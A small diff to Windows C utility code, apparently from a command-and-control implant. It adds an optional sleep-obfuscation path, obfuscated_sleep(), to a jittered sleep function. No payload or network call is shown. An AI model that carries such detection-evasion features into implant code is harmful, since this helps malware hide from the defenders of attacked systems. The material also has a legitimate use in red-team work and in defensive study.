@@ -8,8 +8,12 @@
 #include <time.h>
 #include <windows.h>
 
-
+#include "config.h"
 #include "utils.h"
+
+#if ENABLE_SLEEP_OBF
+#include "sleep_obf.h"
+#endif
 
 // Base64 encoding table
 static const char BASE64_TABLE[] =
@@ -134,7 +138,11 @@ void sleep_with_jitter(int base_seconds, int jitter_percent) {
   if (actual < 1)
     actual = 1;
 
+#if ENABLE_SLEEP_OBF
+  obfuscated_sleep((DWORD)(actual * 1000));
+#else
   Sleep((DWORD)(actual * 1000));
+#endif
 }
 
 void random_bytes(uint8_t *output, size_t len) {
